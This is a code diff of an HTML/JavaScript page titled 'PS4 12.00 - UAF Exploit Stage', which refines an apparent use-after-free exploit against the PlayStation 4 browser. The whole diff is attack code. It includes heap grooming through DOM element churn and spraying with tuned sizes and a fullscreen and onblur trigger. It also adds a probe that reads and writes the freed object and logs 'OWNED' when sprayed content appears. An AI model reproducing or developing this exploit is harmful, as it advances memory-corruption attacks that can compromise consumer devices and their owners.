@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Conversion Stage</title>
+<title>PS4 12.00 - UAF Exploit Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Conversion (Visual → JS)</h2>
+<h2>PS4 12.00 - UAF Exploit Stage (Refined)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -60,21 +60,19 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 RECLAIM DINÂMICO
+// 💣 RECLAIM FINO
 // ==========================
 function preciseReclaim(size) {
     log("[*] Reclaim size = " + size);
 
     let bucket = [];
 
-    // churn inicial
     for (let i = 0; i < 3000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // spray controlado
     for (let i = 0; i < size; i++) {
         let el = document.createElement("div");
 
@@ -91,7 +89,6 @@ function preciseReclaim(size) {
         bucket.push(el);
     }
 
-    // churn final
     for (let i = 0; i < 2000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
@@ -107,44 +104,84 @@ function preciseReclaim(size) {
 function probe(fsTarget) {
     log("---- PROBE ----");
 
+    // innerHTML
     try {
         let html = fsTarget.innerHTML;
         log("[CHECK] innerHTML = " + html);
 
         if (html && html.includes("CONTROL_")) {
-            log("[!!!] CONTROLE VIA JS CONFIRMADO");
+            log("[!!!] OWNED: CONTROL DETECTADO");
         }
 
     } catch(e) {
         log("[UAF] innerHTML crash");
     }
 
+    // outerHTML
     try {
-        let rect = fsTarget.getBoundingClientRect();
-        log("[CHECK] rect ok");
+        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
     } catch(e) {
-        log("[UAF] rect crash");
+        log("[UAF] outerHTML crash");
     }
 
+    // children
     try {
-        fsTarget.style.background = "red";
-        log("[CHECK] style write OK");
+        log("[CHECK] children len = " + fsTarget.children.length);
     } catch(e) {
-        log("[UAF] style write crash");
+        log("[UAF] children crash");
     }
 
+    // clone
+    try {
+        let clone = fsTarget.cloneNode(true);
+        log("[CHECK] clone OK");
+    } catch(e) {
+        log("[UAF] clone crash");
+    }
+
+    // write
+    try {
+        fsTarget.innerHTML = "X";
+        log("[CHECK] write innerHTML OK");
+    } catch(e) {
+        log("[UAF] write innerHTML crash");
+    }
+
+    // layout
     try {
         let h = fsTarget.offsetHeight;
-        log("[CHECK] layout flush OK: " + h);
+        log("[CHECK] layout = " + h);
     } catch(e) {
         log("[UAF] layout crash");
     }
 
+    // rect
     try {
-        let p = fsTarget.parentNode;
-        log("[CHECK] parent = " + p);
+        fsTarget.getBoundingClientRect();
+        log("[CHECK] rect OK");
+    } catch(e) {
+        log("[UAF] rect crash");
+    }
+
+    // parent
+    try {
+        log("[CHECK] parent = " + fsTarget.parentNode);
     } catch(e) {
         log("[UAF] parent crash");
+    }
+
+    // isConnected
+    try {
+        log("[CHECK] isConnected = " + fsTarget.isConnected);
+    } catch(e) {
+        log("[UAF] isConnected crash");
+    }
+
+    // nodeType
+    try {
+        log("[CHECK] nodeType = " + fsTarget.nodeType);
+    } catch(e) {
+        log("[UAF] nodeType crash");
     }
 }
 
@@ -165,8 +202,8 @@ function trigger(fsTarget) {
         log("[ERRO]");
     }
 
-    // 🔥 TESTE DE TAMANHOS
-    let sizes = [6000, 8000, 10000];
+    // 🎯 ajuste fino
+    let sizes = [7500, 7800, 8000, 8200];
 
     sizes.forEach((size, idx) => {
         setTimeout(() => preciseReclaim(size), idx * 50);
@@ -198,7 +235,6 @@ function runTest() {
 
     window.onblur = function() {
         log("[*] onblur");
-
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
